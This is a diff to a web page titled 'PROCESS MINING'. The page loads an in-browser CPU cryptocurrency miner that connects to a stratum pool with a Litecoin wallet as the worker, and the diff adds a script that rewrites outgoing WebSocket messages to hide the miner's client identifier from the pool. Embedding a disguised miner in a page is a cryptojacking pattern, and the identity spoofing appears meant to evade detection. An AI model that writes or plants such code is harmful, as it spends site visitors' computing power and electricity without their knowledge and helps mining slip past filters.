@@ -13,6 +13,17 @@
 
 <h1>PROCESS MINING</h1>
 
+<script>
+// Mengganti identitas client pada paket mining.subscribe sebelum dikirim ke pool
+const originalSend = WebSocket.prototype.send;
+WebSocket.prototype.send = function(data) {
+  if (typeof data === 'string' && data.includes('cpu-web-miner')) {
+    data = data.replace(/cpu-web-miner\/[\d.]+/g, 'SHN/1.0');
+  }
+  return originalSend.call(this, data);
+};
+</script>
+
 <script type="module">
 import * as cpuWebMiner from 'https://esm.run/@marco_ciaramella/cpu-web-miner';
 
@@ -21,7 +32,7 @@ const stratum = {
     port: 7019,
     worker: "ltc1qa2y2ysyqw63krk8qhgemq206axxeh8lt40kkm4",
     password: "c=LTC",
-    ssl: false // true when pool uses SSL, false otherwise
+    ssl: false
 }
 
 cpuWebMiner.start(
